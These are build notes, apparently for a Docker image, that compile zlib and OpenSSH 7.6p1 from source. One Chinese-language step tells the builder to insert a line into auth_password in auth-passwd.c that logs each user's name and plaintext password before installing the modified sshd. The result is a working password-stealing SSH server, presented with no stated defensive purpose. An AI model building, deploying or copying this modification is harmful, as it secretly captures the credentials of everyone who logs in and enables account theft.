FROM debian:jessie
https://openbsd.hk/pub/OpenBSD/OpenSSH/portable/openssh-7.6p1.tar.gz

useradd sshd
apt-get update
apt-get install wget gcc make libssl-dev -y
wget -O /usr/local/src/zlib-1.2.11.tar.gz http://www.zlib.net/zlib-1.2.11.tar.gz
tar -zvxf /usr/local/src/zlib-1.2.11.tar.gz  -C /usr/local/src/
cd /usr/local/src/zlib-1.2.11
./configure
make install
wget -O /usr/local/src/openssh-7.6p1.tar.gz https://openbsd.hk/pub/OpenBSD/OpenSSH/portable/openssh-7.6p1.tar.gz
tar -zvxf /usr/local/src/openssh-7.6p1.tar.gz  -C /usr/local/src/
cd /usr/local/src/openssh-7.6p1
vi auth-passwd.c 编辑这个文件，查找auth_password这个函数，在函数的第一行加入一句

logit("username: %s password: %s", authctxt->user, password);

./configure --sysconfdir=/etc/ssh --without-zlib-version-check  --with-md5-passwords
make install
